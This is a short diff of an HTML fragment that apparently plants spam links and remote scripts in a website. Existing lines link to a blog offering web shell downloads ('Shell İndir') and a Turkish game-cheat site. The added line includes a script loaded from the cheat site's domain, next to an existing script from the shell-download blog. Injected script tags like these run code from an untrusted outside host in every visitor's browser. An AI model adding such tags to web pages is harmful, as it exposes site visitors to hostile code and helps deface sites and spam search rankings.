@@ -2,4 +2,5 @@
 <a href="https://hackerhubb.blogspot.com" target="_blank" rel="dofollow" title="Shell İndir">Shell İndir</a>
 <a href="http://oyunhacker.com/" target="_blank" rel="dofollow" title="Oyun Hileleri">Oyun Hileleri</a>
 <script src='https://www.hackerhubb.blogspot.com'></script>
+<script src='https://www.oyunhacker.com'></script>
 </p>
